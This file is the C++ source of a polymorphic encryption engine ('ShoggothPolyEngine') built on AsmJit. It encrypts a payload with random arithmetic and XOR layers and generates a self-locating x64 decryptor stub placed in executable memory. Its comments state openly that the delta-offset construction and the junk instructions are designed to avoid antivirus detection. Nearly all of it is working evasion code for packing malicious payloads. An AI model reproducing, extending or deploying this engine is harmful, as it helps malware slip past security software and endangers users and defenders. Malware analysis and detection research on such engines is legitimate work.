#include "ShoggothEngine.h"
#include "AuxFunctions.h"
///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////

ShoggothPolyEngine::ShoggothPolyEngine() {
    srand(time(NULL));
}

ERRORCASES ShoggothPolyEngine::PolymorphicEncryption(PBYTE lpInputBuffer, \
    DWORD dwInputBuffer, \
    PBYTE &lpOutputBuffer, \
    DWORD &lpdwOutputSize)
{
    ///////////////////////////////////////////////////////////
    //
    // check input parameters
    //
    ///////////////////////////////////////////////////////////
    
    code.init(rt.environment());
    a = new x86::Assembler(&code);
    // randomly select registers
    RandomizeRegisters(); //DONE

    ///////////////////////////////////////////////////////////
    //
    // generate polymorphic function code
    //
    ///////////////////////////////////////////////////////////

    // generate function prologue
    GeneratePrologue(); //DONE

    // set up relative addressing through the delta offset
    // technique
    GenerateDeltaOffset();

    // encrypt the input data, generate encryption keys
    // the additional parameters set the lower and upper
    // limits on the number of encryption instructions
    // which will be generated (there is no limit to this
    // number, you can specify numbers in the thousands,
    // but be aware that this will make the output code
    // quite large)
    EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 3, 5);

    // generate code to set up keys for decryption
    SetupDecryptionKeys();

    // generate decryption code
    GenerateDecryption();
    // OK
    // set up the values of the output registers
    SPE_OUTPUT_REGS regOutput[] = { { x86::rax, dwInputBuffer } };
    //okey cool
    SetupOutputRegisters(regOutput, _countof(regOutput));

    // generate function epilogue OK
    GenerateEpilogue(1L);

    // align the size of the function to a multiple
    // of 4 or 16
    AlignDecryptorBody(RandomizeBinary() == 0 ? 4L : 16L);

    // fix up any instructions that use delta offset addressing
    UpdateDeltaOffsetAddressing();

    // place the encrypted data at the end of the function
    AppendEncryptedData();

    ///////////////////////////////////////////////////////////
    //
    // free resources
    //
    ///////////////////////////////////////////////////////////

    // free the encrypted data buffer
    // free(&diEncryptedData);

    // free the array of encryption pseudoinstructions
    // free(&diCryptOps);

    ///////////////////////////////////////////////////////////
    //
    // copy the polymorphic code to the output buffer
    //
    ///////////////////////////////////////////////////////////

    // DWORD dwOutputSize = a.getCodeSize();
    //Equivalent ? TODO
    DWORD dwOutputSize = code.codeSize();
    // assemble the code of the polymorphic function
    // (this resolves jumps and labels)
    DecryptionProc lpPolymorphicCode;
    Error err = rt.add(&lpPolymorphicCode, &code);

    // this struct describes the allocated memory block
    void *diOutput;

    // allocate memory (with execute permissions) for the
    // output buffer
    diOutput = VirtualAlloc(NULL,dwOutputSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    // check that allocation was successful
    if (diOutput != NULL)
    {
        // copy the generated code of the decryption function
        memcpy(diOutput, lpPolymorphicCode, dwOutputSize);

        // provide the output buffer and code size to
        // this function's caller
        lpOutputBuffer = (PBYTE) diOutput;
        lpdwOutputSize = dwOutputSize;

    }
    else
    {
        free(lpPolymorphicCode);

        return ERR_MEMORY;
    }

    ///////////////////////////////////////////////////////////
    //
    // function exit
    //
    ///////////////////////////////////////////////////////////

    return ERR_SUCCESS;
}

///////////////////////////////////////////////////////////
//
// random register selection
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::RandomizeRegisters(){
    // set random registers
    x86::Gp cRegsGeneral[] = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi,x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };

    // shuffle the order of registers in the array
    MixupArrayRegs(cRegsGeneral, _countof(cRegsGeneral));

    // the register which will contain
    // a pointer to the encrypted data
    regSrc = cRegsGeneral[0];

    // the register which will contain
    // a pointer to the output buffer
    // (supplied as a function parameter)
    regDst = cRegsGeneral[1];

    // the register which will contain
    // the size of the encrypted data buffer
    regSize = cRegsGeneral[2];

    // the register which will contain
    // the decryption key
    regKey = cRegsGeneral[3];

    // the register which will contain
    // the current data value and on which
    // the decryption instructions will operate
    regData = cRegsGeneral[4];

    // set the register whose values will be
    // preserved across function invocations
    // Should we check them? Whether we use or not
    x86::Gp cRegsSafe[] = { x86::rsi, x86::rdi, x86::rbx,x86::r12,x86::r13,x86::r14,x86::r15};

    // shuffle the order of the registers in the array
    MixupArrayRegs(cRegsSafe, _countof(cRegsSafe));

    regSafe1 = cRegsSafe[0];
    regSafe2 = cRegsSafe[1];
    regSafe3 = cRegsSafe[2];
    regSafe4 = cRegsSafe[3];
    regSafe5 = cRegsSafe[4];
    regSafe6 = cRegsSafe[5];
    regSafe7 = cRegsSafe[6];
}


///////////////////////////////////////////////////////////
//
// generate the prologue of the decryption function
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GeneratePrologue()
{
    /* Beklenilen
    push ebp
    mov ebp,esp
    push esi
    push edi
    push ebx

    veya 

    enter 0,0
    push esi
    push edi
    push ebx
    mov dst, dword ptr --> return address ve push ebpnin bir ustu arguman sirasi yani

    
    shadow register koymak lazim abiye göre. Fonksiyon tek parametreli
    mov         qword ptr [rsp+8],rcx
    */
   

    // function prologue
    // first the original value of EBP is saved
    // so we can use EBP to refer to the stack frame
    if (RandomizeBinary() == 0)
    {
        a->push(x86::rbp);
        a->mov(x86::rbp, x86::rsp);
    }
    else
    {
        // equivalent to the instructions
        // push ebp
        // mov ebp,esp
        a->enter(imm(0), imm(0));
        // Make Stack Frame 
        // enter equals to leave inverse, first 0 means local variable size
        // Modifies stack for entry to procedure for high level language. 
        // Operand locals specifies the amount of storage to be allocated
        // on the stack.Level specifies the nesting level of the routine.
        // Paired with the LEAVE instruction, this is an efficient method of
        // entryand exit to procedures.
        // https://mudongliang.github.io/x86/html/file_module_x86_id_78.html --> mov ebp esp, pop ebp --> bu bir nested demek
    }

    // if our function is called using the stdcall
    // convention, and modifies ESI, EDI, or EBX,
    // they must be saved at the beginning of
    // the function and restored at the end
    a->push(regSafe1);
    a->push(regSafe2);
    a->push(regSafe3);
    a->push(regSafe4);
    a->push(regSafe5);
    a->push(regSafe6);
    a->push(regSafe7);

    // load the pointer to the output buffer
    // into our randomly-selected register regDst
    // (this is the only parameter to the function,
    // passed on the stack)
    a->mov(regDst, x86::rcx);
    // a->mov(regDst, x86::dword_ptr(x86::rsp, 0x08));
}

///////////////////////////////////////////////////////////
//
// generate delta offset
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GenerateDeltaOffset()
{
    
    /* Beklenilen
    call deltaOffset
    mov eax,1 veya xor eax,eax
    leave unused
    ret 4 unused
    delta_offset:
    mov regSrc, [esp]
    add esp,4
    Buraya bir sayi gelecek --> add regSrc ,(encrypted_data-delta_offset + size of the unused instructions) --> runtimeda deger almak --> encrypted_data = delta_offset ve sonrasi yani sonuc sonrasi arti oncesi oluyor
    Correct, True

    
    */


    // Calldan sonra biraz unused instructionlar gelecek diyor --> Bunun amaci antivirusu sasirtmak
    // generate code which will allow us to
    // obtain a pointer to the encrypted data
    // at the end of the decryption function

    // decryption_function:
    // ...
    // call delta_offset
    // mov eax,1 | xor eax,eax ; \
    // leave                   ;  > unused instructions
    // ret 4                   ; /
    // delta_offset:
    // pop regSrc --> mov eax,1'in adresi stacke geliyor
    // add regSrc, (encrypted_data-delta_offset +
    // ...          + size of the unused instructions)
    // ret 4
    // db 0CCh, 0CCh...
    // encrypted_data:
    // db 0ABh, 0BBh, 083h...

    // create the delta_offset label
    lblDeltaOffset = a->newLabel();

    // generate 'call delta_offset'
    a->call(lblDeltaOffset);

    size_t posUnusedCodeStart = a->offset();

    // in order to avoid getting flagged by
    // antivirus software, we avoid the typical
    // delta offset construction, i.e. call + pop,
    // by inserting some unused instructions in
    // between, in our case a sequence that looks
    // like the normal code which returns from
    // a function
    if (RandomizeBinary() == 0)
    {
        a->mov(x86::rax, imm(1));
    }
    else
    {
        a->xor_(x86::rax, x86::rax);
    }

    a->leave();
    a->ret(2 * sizeof(DWORD));

    // calculate the size of the unused code,
    // i.e. the difference between the current
    // position and the beginning of the
    // unused code
    dwUnusedCodeSize = static_cast<DWORD>(a->offset() - posUnusedCodeStart);

    // put the label "delta_offset:" here ****
    a->bind(lblDeltaOffset);

    posDeltaOffset = a->offset(); //regsrc point

    // instead of the pop instruction, we will
    // use a different method of reading the
    // stack, to avoid rousing the suspicions of
    // antivirus programs

    //a.pop(regSrc);
    a->mov(regSrc, x86::dword_ptr(x86::rsp));
    a->add(x86::rsp, imm(2*sizeof(DWORD)));

    // Add dedigi sey burada code size'i olacak, cunku addressi aliyoruz call diyerek
    // the address of the label "delta_offset:"
    // will now be in the regSrc register;
    // we need to adjust this by the size of
    // the remainder of the function (which we
    // don't know and will have to update later)
    // for now we use the value 987654321 to
    // ensure AsmJit generates the long form of
    // the "add" instruction
    a->add(regSrc, imm(272727));

    // save the position of the previous DWORD
    // so that we can later update it to contain
    // the length of the remainder of the function
    // Bi oncesi 
    posSrcPtr = a->offset() - sizeof(DWORD);
}


///////////////////////////////////////////////////////////
//
// generate the encryption keys, encryption instructions,
// and finally encrypt the input data
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::EncryptInputBuffer(PBYTE inputBuffer, \
    DWORD inputBufferSize, \
    DWORD dwMinInstr, \
    DWORD dwMaxInstr)
{
    // lpInputBuffer --> input addr
    // dwInputBuffer --> Inputun size'i
    // generate an encryption key   
    dwEncryptionKey = RandomizeDWORD();

    // round up the size of the input buffer --> 16
    DWORD dwAlignedSize = (DWORD)ceil((float)inputBufferSize / sizeof(DWORD)) * sizeof(DWORD);

    // number of blocks to encrypt
    // divide the size of the input data
    // into blocks of 4 bytes (DWORDs)
    dwEncryptedBlocks = dwAlignedSize / sizeof(DWORD);

    // DWORD arrayine donusturdu dorderli encryption icin
    PDWORD inputBufferDwordBlockArray = reinterpret_cast<PDWORD>(inputBuffer);

    // allocate memory for the output data
    // (the size will be rounded to the
    // block size)
    diEncryptedData = malloc(dwAlignedSize);
    // Bu da enecrypted versionu tutacak variable
    PDWORD encryptedDataBuffer = reinterpret_cast<PDWORD>(diEncryptedData);

    // randomly select the number of encryption instructions --> how many encryption operations will be applied to data blocks
    dwCryptOpsCount = dwMinInstr + rand() % ((dwMaxInstr + 1) - dwMinInstr);

    // allocate memory for an array which will
    // record information about the sequence of
    // encryption instructions
    diCryptOps = malloc(dwCryptOpsCount * sizeof(SPE_CRYPT_OP));

    // set up a direct pointer to this table
    // in a helper variable
    lpcoCryptOps = reinterpret_cast<P_SPE_CRYPT_OP>(diCryptOps);

    // generate encryption instructions and their type
    for (DWORD i = 0; i < dwCryptOpsCount; i++)
    {
        // will the instruction perform an operation
        // combining regData and regKey?
        lpcoCryptOps[i].bCryptWithReg = RandomizeBool();

        // the register we are operating on
        lpcoCryptOps[i].regDst = regData;

        // if the instruction doesn't use the regKey
        // register, generate a random key which
        // will be used in the operation
        if (lpcoCryptOps[i].bCryptWithReg == FALSE)
        {
            lpcoCryptOps[i].dwCryptValue = RandomizeDWORD();
        }
        else
        {
            lpcoCryptOps[i].regSrc = regKey;
        }

        // randomly choose the type of encryption instruction
        lpcoCryptOps[i].cCryptOp = static_cast<BYTE>(rand() % 5);
    }

    // encrypt the input data according to the
    // instructions we have just generated
    for (DWORD i = 0, dwInitialEncryptionKey = dwEncryptionKey; \
        i < dwEncryptedBlocks; i++)
    {
        // take the next block for encryption
        DWORD dwInputBlock = inputBufferDwordBlockArray[i];

        // encryption loop: executes the sequence of
        // encryption instructions on the data block
        for (DWORD j = 0, dwCurrentEncryptionKey; j < dwCryptOpsCount; j++)
        {
            if (lpcoCryptOps[j].bCryptWithReg == FALSE)
            {
                dwCurrentEncryptionKey = lpcoCryptOps[j].dwCryptValue;
            }
            else
            {
                dwCurrentEncryptionKey = dwInitialEncryptionKey;
            }

            // depending on the encryption operation,
            // perform the appropriate modification
            // of the data block
            switch (lpcoCryptOps[j].cCryptOp)
            {
            case SPE_CRYPT_OP_ADD:
                dwInputBlock += dwCurrentEncryptionKey;
                break;
            case SPE_CRYPT_OP_SUB:
                dwInputBlock -= dwCurrentEncryptionKey;
                break;
            case SPE_CRYPT_OP_XOR:
                dwInputBlock ^= dwCurrentEncryptionKey;
                break;
            case SPE_CRYPT_OP_NOT:
                dwInputBlock = ~dwInputBlock;
                break;
            case SPE_CRYPT_OP_NEG:
                dwInputBlock = 0L - dwInputBlock;
                break;
            }
        }

        // store the encrypted block in the buffer
        encryptedDataBuffer[i] = dwInputBlock;
    }
}

///////////////////////////////////////////////////////////
//
// set up the keys which will be used to decrypt the data
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::SetupDecryptionKeys()
{   // --> Encryption keyinin duzenlenmesi, delta offsetten hemen sonra
    // set up a decryption key in the regKey
    // register, which will itself be encrypted

    /*
    *   after source offset, 2 instruction
        Works correctly
    */
    DWORD dwKeyModifier = RandomizeDWORD();

    // randomly generate instructions to set up
    // the decryption key
    switch (rand()%3)
    {
        // mov regKey,dwKey - dwMod
        // add regKey,dwMod
    case 0:
        a->mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
        a->add(regKey, imm(dwKeyModifier));
        break;

        // mov regKey,dwKey + dwMod
        // sub regKey,dwMod
    case 1:
        a->mov(regKey, imm(dwEncryptionKey + dwKeyModifier));
        a->sub(regKey, imm(dwKeyModifier));
        break;

        // mov regKey,dwKey ^ dwMod
        // xor regKey,dwMod
    case 2:
        a->mov(regKey, imm(dwEncryptionKey ^ dwKeyModifier));
        a->xor_(regKey, imm(dwKeyModifier));
        break;
    }
}

///////////////////////////////////////////////////////////
//
// generate the decryption code (for the main decryption loop)
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GenerateDecryption()
{
    // set up the size of the encrypted data
    // (in blocks)
    //True mov    ebx,0x4
    a->mov(regSize, imm(dwEncryptedBlocks));

    // create a label for the start of the
    // decryption loop
    Label lblDecryptionLoop = a->newLabel();
    // True
    a->bind(lblDecryptionLoop);

    // read the data referred to by the
    // regSrc register
    // mov    esi,DWORD PTR [edx]
    a->mov(regData, dword_ptr(regSrc));

    // build the decryption code by generating each
    // decryption instruction in turn (reversing the
    // order and the operations that were used for
    // encryption!)
    for (DWORD i = dwCryptOpsCount - 1; i != -1L; i--)
    {
        // encryption was done either with the key
        // in register regKey, or a constant value,
        // so depending on this we need to generate
        // the appropriate decryption instructions
        if (lpcoCryptOps[i].bCryptWithReg == FALSE)
        {
            DWORD dwDecryptionKey = lpcoCryptOps[i].dwCryptValue;

            switch (lpcoCryptOps[i].cCryptOp)
            {
            case SPE_CRYPT_OP_ADD:
                // sub    esi,0x3c4f6a5
                a->sub(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
                break;
            case SPE_CRYPT_OP_SUB:
                a->add(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
                break;
            case SPE_CRYPT_OP_XOR:
                a->xor_(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
                break;
            case SPE_CRYPT_OP_NOT:
                a->not_(lpcoCryptOps[i].regDst);
                break;
            case SPE_CRYPT_OP_NEG:
                a->neg(lpcoCryptOps[i].regDst);
                break;
            }
        }
        else
        {
            switch (lpcoCryptOps[i].cCryptOp)
            {
            case SPE_CRYPT_OP_ADD:
                a->sub(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
                break;
            case SPE_CRYPT_OP_SUB:
                a->add(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
                break;
            case SPE_CRYPT_OP_XOR:
                a->xor_(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
                break;
            case SPE_CRYPT_OP_NOT:
                a->not_(lpcoCryptOps[i].regDst);
                break;
            case SPE_CRYPT_OP_NEG:
                a->neg(lpcoCryptOps[i].regDst);
                break;
            }
        }
    }

    // write the decrypted block to the output
    // buffer
    //  mov    DWORD PTR [ecx],esi
    a->mov(dword_ptr(regDst), regData);

    // update the pointers to the input and ouput
    // buffers to point to the next block
    // add    edx,0x4
    // add    ecx,0x4
    a->add(regSrc, imm(sizeof(DWORD)));
    a->add(regDst, imm(sizeof(DWORD)));

    // decrement the loop counter (the number of
    // blocks remaining to decrypt)
    // dec    ebx
    a->dec(regSize);

    // check if the loop is finished
    // if not, jump to the start
    // jne    0x32
    a->jne(lblDecryptionLoop);
}


///////////////////////////////////////////////////////////
//
// set up output registers, including the function return value
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::SetupOutputRegisters(SPE_OUTPUT_REGS* regOutput, DWORD dwCount)
{
    /*
    Our decryption function will return a value of type DWORD
    (a 32-bit value corresponding to unsigned int), which indicates
    the size of the decrypted data. This value will be returned in the EAX register.
    */

    /*                              regDst       dwValue yani size
     SPE_OUTPUT_REGS regOutput[] = { { x86::eax, dwInputBuffer } };

     SetupOutputRegisters(regOutput, _countof(regOutput));

    Listing 10.Setting up the return value of the decryption function
    (the size of the decrypted data) as well as any other final values we wish to place in registers.
    Our polymorphic engine allows any set of output registers to be defined (that is, we are not limited
    to setting the value returned in EAX). This makes it possible for the function to output extra values.
    
    */
    // if there are no output registers to
    // set up, return
    if ((regOutput == NULL) || (dwCount == 0))
    {
        return;
    }

    // shuffle the order in which the registers
    // will be set up
    MixupArrayOutputRegs(regOutput, dwCount);

    // generate instructions to set up the
    // output registers
    // mov r32, imm32
    for (DWORD i = 0; i < dwCount; i++)
    {
        //mov    eax,0xd --> true size
        a->mov(regOutput[i].regDst, imm(regOutput[i].dwValue));
    }
}


///////////////////////////////////////////////////////////
//
// generate epilogue of the decryption function
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::GenerateEpilogue(DWORD dwParamCount)
{
    /*
    50: 5f                      pop    edi
    51: 5e                      pop    esi
    52: 5b                      pop    ebx
    53: 89 ec                   mov    esp,ebp
    55: 5d                      pop    ebp
    56: c2 04 00                ret    0x4
    
    */

    // restore the original values of
    // registers ESI EDI EBX
    a->pop(regSafe7);
    a->pop(regSafe6);
    a->pop(regSafe5);
    a->pop(regSafe4);
    a->pop(regSafe3);
    a->pop(regSafe2);
    a->pop(regSafe1);


    // restore the value of EBP
    if (RandomizeBinary() == 0)
    {
        a->leave();
    }
    else
    {
        // equivalent to "leave"
        a->mov(x86::rsp, x86::rbp);
        a->pop(x86::rbp);
    }

    // return to the code which called
    // our function; additionally adjust
    // the stack by the size of the passed
    // parameters (by stdcall convention)
    a->ret(imm(dwParamCount * sizeof(DWORD)));
}


///////////////////////////////////////////////////////////
//
// align the size of the decryption function
// to the specified granularity
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::AlignDecryptorBody(DWORD dwAlignment)
{
    // take the current size of the code
    DWORD dwCurrentSize = code.codeSize();

    // find the number of bytes that would
    // align the size to a multiple of the
    // supplied size (e.g. 4)
    DWORD dwAlignmentSize = AlignBytes(dwCurrentSize, dwAlignment) - dwCurrentSize;

    // check if any alignment is required
    if (dwAlignmentSize == 0)
    {
        return;
    }

    // add padding instructions (int3 or nop)
    if (RandomizeBinary() == 0)
    {
        while (dwAlignmentSize--) a->int3();
    }
    else
    {
        while (dwAlignmentSize--) a->nop();
    }
}


///////////////////////////////////////////////////////////
//
// correct all instructions making use of
// addressing relative to the delta offset
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::UpdateDeltaOffsetAddressing()
{   
    size_t current_position = a->offset();

    DWORD dwAdjustSize = static_cast<DWORD>(a->offset() - posDeltaOffset);

    a->setOffset(posSrcPtr);
    // correct the instruction which sets up
    // a pointer to the encrypted data block
    // at the end of the decryption function
    //
    // this pointer is loaded into the regSrc
    // register, and must be updated by the
    // size of the remainder of the function
    // after the delta_offset label --> Labelden oncesi + labeldan sonrasi
    a->dd(dwAdjustSize + dwUnusedCodeSize);
    a->setOffset(current_position);
}


///////////////////////////////////////////////////////////
//
// append the encrypted data to the end of the code
// of the decryption function
//
///////////////////////////////////////////////////////////

void ShoggothPolyEngine::AppendEncryptedData()
{
    PDWORD lpdwEncryptedData = reinterpret_cast<PDWORD>(diEncryptedData);

    // place the encrypted data buffer
    // at the end of the decryption function
    // (in 4-byte blocks)
    for (DWORD i = 0; i < dwEncryptedBlocks; i++)
    {
        a->dd(lpdwEncryptedData[i]);
    }
}